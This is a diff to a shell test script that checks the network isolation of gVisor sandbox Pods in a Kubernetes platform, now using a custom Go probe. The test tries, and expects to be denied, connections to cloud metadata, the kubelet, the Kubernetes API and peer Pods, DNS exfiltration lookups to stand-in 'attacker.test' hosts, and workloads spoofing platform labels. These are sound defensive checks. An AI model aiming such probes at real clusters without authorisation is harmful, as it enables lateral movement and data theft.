@@ -27,7 +27,7 @@ required_env=(
 for name in "${required_env[@]}"; do
   [ -n "${!name:-}" ] || { echo "error: $name is required" >&2; exit 2; }
 done
-for command in curl jq kubectl base64 python3; do
+for command in curl go jq kubectl base64 python3; do
   command -v "$command" >/dev/null || { echo "error: missing required command: $command" >&2; exit 2; }
 done
 for workspace in "$BEX_WORKSPACE_A" "$BEX_WORKSPACE_B"; do
@@ -149,6 +149,14 @@ preflight_cluster() {
     kubectl get "$resource" >/dev/null 2>&1 \
       || fail "required hardening resource $resource is not deployed"
   done
+
+  kubectl get validatingadmissionpolicy bex-sandbox-pods -o json | jq -e '
+    .spec.failurePolicy == "Fail" and
+    .spec.matchConstraints.namespaceSelector.matchLabels["app.bex.co/regime"] == "sandbox"' >/dev/null \
+    || fail "sandbox Pod admission is not fail-closed on the native sandbox namespace selector"
+  kubectl get validatingadmissionpolicybinding bex-sandbox-pods -o json | jq -e '
+    (.spec.validationActions | sort) == ["Audit", "Deny"]' >/dev/null \
+    || fail "sandbox Pod admission binding does not deny and audit violations"
 
   for namespace in "$namespace_a" "$namespace_b"; do
     kubectl get namespace "$namespace" -o json | jq -e --arg workspace "${namespace%-sandbox}" '
@@ -329,6 +337,18 @@ workload_container() {
 }
 container_a="$(workload_container "$namespace_a" "$pod_a")"
 container_b="$(workload_container "$namespace_a" "$pod_b")"
+sandbox_node="$(kubectl -n "$namespace_a" get pod "$pod_a" -o jsonpath='{.spec.nodeName}')"
+sandbox_arch="$(kubectl get node "$sandbox_node" -o jsonpath='{.status.nodeInfo.architecture}')"
+case "$sandbox_arch" in
+  amd64 | arm64) ;;
+  *) fail "unsupported sandbox node architecture $sandbox_arch" ;;
+esac
+probe_binary="$fixture_dir/m35-netprobe"
+CGO_ENABLED=0 GOOS=linux GOARCH="$sandbox_arch" go build -trimpath -o "$probe_binary" scripts/m35-netprobe.go \
+  || fail "could not build the sandbox network probe for $sandbox_arch"
+kubectl -n "$namespace_a" exec -i "$pod_a" -c "$container_a" -- /bin/sh -c \
+  'umask 077; /bin/busybox cat > /tmp/m35-netprobe && chmod 700 /tmp/m35-netprobe' \
+  <"$probe_binary" || fail "could not install the network probe in the attacker sandbox"
 
 for tuple in "$namespace_a:$pod_a:$container_a" "$namespace_a:$pod_b:$container_b"; do
   IFS=: read -r ns pod container <<<"$tuple"
@@ -348,9 +368,11 @@ for tuple in "$namespace_a:$pod_a:$container_a" "$namespace_a:$pod_b:$container_
     ([.spec.initContainers[]?, .spec.containers[]?] |
      all(.[]; (.name | ascii_downcase | contains("egress")) | not))' <<<"$pod_json" >/dev/null \
     || fail "$ns/$pod lost the digest-pinned execd or unexpectedly gained an egress sidecar"
-  kubectl -n "$ns" exec "$pod" -c "$container" -- python3 -c 'import socket; socket.gethostname()' >/dev/null \
+  kubectl -n "$ns" exec "$pod" -c "$container" -- /bin/sh -c 'true' \
     || fail "$ns/$pod workload container is not executable"
 done
+kubectl -n "$namespace_a" exec "$pod_a" -c "$container_a" -- /tmp/m35-netprobe resolve localhost >/dev/null \
+  || fail "the installed sandbox network probe is not executable"
 pass "attacker-controlled probes run inside real gVisor sandbox Pods"
 
 echo "==> verify the shipped exec path uses the same owner boundary"
@@ -375,8 +397,7 @@ expect_status 404 "$fixture_dir/owner-c.curl" POST \
 pass "owner/admin exec succeeds while cross-owner and cross-workspace exec hide existence"
 
 exec_a() { kubectl -n "$namespace_a" exec "$pod_a" -c "$container_a" -- "$@"; }
-tcp_probe='import socket,sys; s=socket.create_connection((sys.argv[1],int(sys.argv[2])),5); s.close()'
-tls_probe='import socket,ssl,sys; host=sys.argv[1]; sni=sys.argv[2] if len(sys.argv)>2 else host; s=socket.create_connection((host,443),5); ssl._create_unverified_context().wrap_socket(s,server_hostname=sni).close()'
+python_tcp_probe='import socket,sys; s=socket.create_connection((sys.argv[1],int(sys.argv[2])),5); s.close()'
 
 expect_denied() {
   local name="$1"
@@ -400,82 +421,79 @@ lifecycle_ip="$(kubectl -n opensandbox-system get service opensandbox-server -o 
 bex_cp_ip="$(kubectl -n bex-system get service bex-api -o jsonpath='{.spec.clusterIP}')"
 exec_gateway_ip="$(kubectl -n bex-system get service bex-ssh-gateway -o jsonpath='{.spec.clusterIP}')"
 api_server_ip="$(kubectl -n default get service kubernetes -o jsonpath='{.spec.clusterIP}')"
-sandbox_node="$(kubectl -n "$namespace_a" get pod "$pod_a" -o jsonpath='{.spec.nodeName}')"
 node_ip="$(kubectl get node "$sandbox_node" -o jsonpath='{.status.addresses[?(@.type=="InternalIP")].address}')"
 
-expect_allowed "own Pod loopback execd" exec_a python3 -c "$tcp_probe" 127.0.0.1 44772
-expect_denied "same-workspace peer execd" exec_a python3 -c "$tcp_probe" "$pod_b_ip" 44772
-expect_denied "cross-workspace peer execd" exec_a python3 -c "$tcp_probe" "$pod_c_ip" 44772
+expect_allowed "own Pod loopback execd" exec_a /tmp/m35-netprobe tcp 127.0.0.1 44772
+expect_denied "same-workspace peer execd" exec_a /tmp/m35-netprobe tcp "$pod_b_ip" 44772
+expect_denied "cross-workspace peer execd" exec_a /tmp/m35-netprobe tcp "$pod_c_ip" 44772
 
 kubectl -n "$namespace_a" exec "$pod_b" -c "$container_b" -- sh -c \
-  'nohup python3 -m http.server 18080 >/tmp/m35-http.log 2>&1 </dev/null &'
+  'nohup /bin/busybox httpd -f -p 18080 >/tmp/m35-http.log 2>&1 </dev/null &'
 sleep 2
 kubectl -n "$namespace_a" expose pod "$pod_b" --name "$peer_service" --port 18080 --target-port 18080 >/dev/null
 peer_service_ip="$(kubectl -n "$namespace_a" get service "$peer_service" -o jsonpath='{.spec.clusterIP}')"
-expect_denied "same-workspace peer Pod user port" exec_a python3 -c "$tcp_probe" "$pod_b_ip" 18080
-expect_denied "same-workspace peer Service" exec_a python3 -c "$tcp_probe" "$peer_service_ip" 18080
+expect_denied "same-workspace peer Pod user port" exec_a /tmp/m35-netprobe tcp "$pod_b_ip" 18080
+expect_denied "same-workspace peer Service" exec_a /tmp/m35-netprobe tcp "$peer_service_ip" 18080
 
 python_image='python:3.12.13-slim-trixie@sha256:cab2dbf575e971934a81e4622f5aba17aa7929719bd7e31033a3a83b97fd0464'
 kubectl -n "$BEX_WORKSPACE_A" run "$hosting_pod" --image "$python_image" --restart Never \
   --labels "app.bex.co/m35-fixture=$run_id" --command -- python3 -m http.server 18081 >/dev/null
 kubectl -n "$BEX_WORKSPACE_A" wait --for=condition=Ready "pod/$hosting_pod" --timeout=180s >/dev/null
 hosting_ip="$(kubectl -n "$BEX_WORKSPACE_A" get pod "$hosting_pod" -o jsonpath='{.status.podIP}')"
-expect_denied "sandbox to same-workspace hosting namespace" exec_a python3 -c "$tcp_probe" "$hosting_ip" 18081
-expect_denied "sandbox to lifecycle API" exec_a python3 -c "$tcp_probe" "$lifecycle_ip" 8077
-expect_denied "sandbox to Kubernetes API" exec_a python3 -c "$tcp_probe" "$api_server_ip" 443
-expect_denied "sandbox to node/kubelet" exec_a python3 -c "$tcp_probe" "$node_ip" 10250
-expect_denied "sandbox to cloud metadata" exec_a python3 -c "$tcp_probe" 169.254.169.254 80
+expect_denied "sandbox to same-workspace hosting namespace" exec_a /tmp/m35-netprobe tcp "$hosting_ip" 18081
+expect_denied "sandbox to lifecycle API" exec_a /tmp/m35-netprobe tcp "$lifecycle_ip" 8077
+expect_denied "sandbox to Kubernetes API" exec_a /tmp/m35-netprobe tcp "$api_server_ip" 443
+expect_denied "sandbox to node/kubelet" exec_a /tmp/m35-netprobe tcp "$node_ip" 10250
+expect_denied "sandbox to cloud metadata" exec_a /tmp/m35-netprobe tcp 169.254.169.254 80
 
 # www.github.com is publicly resolvable but is intentionally absent from the
 # exact allowlist, so failure demonstrates DNS policy rather than NXDOMAIN.
-expect_denied "unapproved DNS name resolution" exec_a python3 -c \
-  'import socket; socket.getaddrinfo("www.github.com",443)'
-expect_denied "unique DNS-exfiltration query" exec_a python3 -c \
-  'import socket,sys; socket.getaddrinfo(sys.argv[1],443)' "${run_id}.attacker.test"
-expect_allowed "approved FQDN with TLS SNI" exec_a python3 -c "$tls_probe" api.github.com
-expect_denied "unapproved public FQDN" exec_a python3 -c "$tls_probe" example.com
-approved_ip="$(exec_a python3 -c 'import socket; print(socket.gethostbyname("api.github.com"))')"
+expect_denied "unapproved DNS name resolution" exec_a /tmp/m35-netprobe resolve www.github.com
+expect_denied "unique DNS-exfiltration query" exec_a /tmp/m35-netprobe resolve "${run_id}.attacker.test"
+expect_allowed "approved FQDN with TLS SNI" exec_a /tmp/m35-netprobe tls api.github.com 443 api.github.com
+expect_denied "unapproved public FQDN" exec_a /tmp/m35-netprobe tls example.com 443 example.com
+approved_ip="$(exec_a /tmp/m35-netprobe resolve api.github.com | tail -1)"
 [ -n "$approved_ip" ] || fail "could not resolve api.github.com inside the sandbox"
-expect_denied "approved destination by literal IP/wrong SNI" exec_a python3 -c "$tls_probe" "$approved_ip"
-expect_allowed "learned approved public IP with approved SNI" exec_a python3 -c "$tls_probe" "$approved_ip" api.github.com
-expect_denied "private Kubernetes API target with approved SNI" exec_a python3 -c "$tls_probe" "$api_server_ip" api.github.com
+expect_denied "approved destination by literal IP/wrong SNI" exec_a /tmp/m35-netprobe tls "$approved_ip" 443 example.com
+expect_allowed "learned approved public IP with approved SNI" exec_a /tmp/m35-netprobe tls "$approved_ip" 443 api.github.com
+expect_denied "private Kubernetes API target with approved SNI" exec_a /tmp/m35-netprobe tls "$api_server_ip" 443 api.github.com
 
 kubectl -n bex-system run "$platform_pod" --image "$python_image" --restart Never \
   --labels "app.kubernetes.io/name=bex-api" \
   --overrides='{"spec":{"securityContext":{"runAsNonRoot":true,"runAsUser":10001,"seccompProfile":{"type":"RuntimeDefault"}},"containers":[{"name":"'"$platform_pod"'","image":"'"$python_image"'","command":["sleep","300"],"securityContext":{"allowPrivilegeEscalation":false,"capabilities":{"drop":["ALL"]}}}]}}' >/dev/null
 kubectl -n bex-system wait --for=condition=Ready "pod/$platform_pod" --timeout=180s >/dev/null
 expect_denied "bex-api label spoof on the default ServiceAccount" \
-  kubectl -n bex-system exec "$platform_pod" -- python3 -c "$tcp_probe" "$lifecycle_ip" 8077
+  kubectl -n bex-system exec "$platform_pod" -- python3 -c "$python_tcp_probe" "$lifecycle_ip" 8077
 expect_denied "bex-api label spoof to sandbox exec gateway" \
-  kubectl -n bex-system exec "$platform_pod" -- python3 -c "$tcp_probe" "$exec_gateway_ip" 8081
+  kubectl -n bex-system exec "$platform_pod" -- python3 -c "$python_tcp_probe" "$exec_gateway_ip" 8081
 
 kubectl -n bex-system run "$platform_allowed_pod" --image "$python_image" --restart Never \
   --labels "app.kubernetes.io/name=bex-api" \
   --overrides='{"spec":{"serviceAccountName":"bex-api","automountServiceAccountToken":false,"securityContext":{"runAsNonRoot":true,"runAsUser":10001,"seccompProfile":{"type":"RuntimeDefault"}},"containers":[{"name":"'"$platform_allowed_pod"'","image":"'"$python_image"'","command":["sleep","300"],"securityContext":{"allowPrivilegeEscalation":false,"capabilities":{"drop":["ALL"]}}}]}}' >/dev/null
 kubectl -n bex-system wait --for=condition=Ready "pod/$platform_allowed_pod" --timeout=180s >/dev/null
 expect_allowed "bex-api namespace + ServiceAccount + workload identity" \
-  kubectl -n bex-system exec "$platform_allowed_pod" -- python3 -c "$tcp_probe" "$lifecycle_ip" 8077
+  kubectl -n bex-system exec "$platform_allowed_pod" -- python3 -c "$python_tcp_probe" "$lifecycle_ip" 8077
 expect_allowed "bex-api identity to sandbox exec gateway" \
-  kubectl -n bex-system exec "$platform_allowed_pod" -- python3 -c "$tcp_probe" "$exec_gateway_ip" 8081
+  kubectl -n bex-system exec "$platform_allowed_pod" -- python3 -c "$python_tcp_probe" "$exec_gateway_ip" 8081
 
 kubectl -n opensandbox-system run "$execd_spoof_pod" --image "$python_image" --restart Never \
   --labels "app.kubernetes.io/name=opensandbox-server" \
   --overrides='{"spec":{"automountServiceAccountToken":false,"securityContext":{"runAsNonRoot":true,"runAsUser":10001,"seccompProfile":{"type":"RuntimeDefault"}},"containers":[{"name":"'"$execd_spoof_pod"'","image":"'"$python_image"'","command":["sleep","300"],"securityContext":{"allowPrivilegeEscalation":false,"capabilities":{"drop":["ALL"]}}}]}}' >/dev/null
 kubectl -n opensandbox-system wait --for=condition=Ready "pod/$execd_spoof_pod" --timeout=180s >/dev/null
 expect_denied "lifecycle-server label spoof on the default ServiceAccount" \
-  kubectl -n opensandbox-system exec "$execd_spoof_pod" -- python3 -c "$tcp_probe" "$pod_a_ip" 44772
+  kubectl -n opensandbox-system exec "$execd_spoof_pod" -- python3 -c "$python_tcp_probe" "$pod_a_ip" 44772
 
 kubectl -n opensandbox-system run "$execd_allowed_pod" --image "$python_image" --restart Never \
   --labels "app.kubernetes.io/name=opensandbox-server" \
   --overrides='{"spec":{"serviceAccountName":"opensandbox-server","automountServiceAccountToken":false,"securityContext":{"runAsNonRoot":true,"runAsUser":10001,"seccompProfile":{"type":"RuntimeDefault"}},"containers":[{"name":"'"$execd_allowed_pod"'","image":"'"$python_image"'","command":["sleep","300"],"securityContext":{"allowPrivilegeEscalation":false,"capabilities":{"drop":["ALL"]}}}]}}' >/dev/null
 kubectl -n opensandbox-system wait --for=condition=Ready "pod/$execd_allowed_pod" --timeout=180s >/dev/null
 expect_allowed "lifecycle-server namespace + ServiceAccount + workload identity to execd" \
-  kubectl -n opensandbox-system exec "$execd_allowed_pod" -- python3 -c "$tcp_probe" "$pod_a_ip" 44772
+  kubectl -n opensandbox-system exec "$execd_allowed_pod" -- python3 -c "$python_tcp_probe" "$pod_a_ip" 44772
 expect_allowed "lifecycle-server fixed tenant-resolver DNS" \
   kubectl -n opensandbox-system exec "$execd_allowed_pod" -- python3 -c \
     'import socket; socket.getaddrinfo("bex-api.bex-system.svc",8091)'
 expect_allowed "lifecycle-server tenant-resolver connection" \
-  kubectl -n opensandbox-system exec "$execd_allowed_pod" -- python3 -c "$tcp_probe" "$bex_cp_ip" 8091
+  kubectl -n opensandbox-system exec "$execd_allowed_pod" -- python3 -c "$python_tcp_probe" "$bex_cp_ip" 8091
 expect_denied "lifecycle-server DNS exfiltration" \
   kubectl -n opensandbox-system exec "$execd_allowed_pod" -- python3 -c \
     'import socket,sys; socket.getaddrinfo(sys.argv[1],53)' "${run_id}.server-attacker.test"
@@ -485,7 +503,7 @@ kubectl -n opensandbox-system run "$controller_probe_pod" --image "$python_image
   --overrides='{"spec":{"serviceAccountName":"opensandbox-controller-manager","automountServiceAccountToken":false,"securityContext":{"runAsNonRoot":true,"runAsUser":10001,"seccompProfile":{"type":"RuntimeDefault"}},"containers":[{"name":"'"$controller_probe_pod"'","image":"'"$python_image"'","command":["sleep","300"],"securityContext":{"allowPrivilegeEscalation":false,"capabilities":{"drop":["ALL"]}}}]}}' >/dev/null
 kubectl -n opensandbox-system wait --for=condition=Ready "pod/$controller_probe_pod" --timeout=180s >/dev/null
 expect_allowed "controller identity to Kubernetes API" \
-  kubectl -n opensandbox-system exec "$controller_probe_pod" -- python3 -c "$tcp_probe" "$api_server_ip" 443
+  kubectl -n opensandbox-system exec "$controller_probe_pod" -- python3 -c "$python_tcp_probe" "$api_server_ip" 443
 expect_denied "controller DNS exfiltration" \
   kubectl -n opensandbox-system exec "$controller_probe_pod" -- python3 -c \
     'import socket,sys; socket.getaddrinfo(sys.argv[1],53)' "${run_id}.controller-attacker.test"
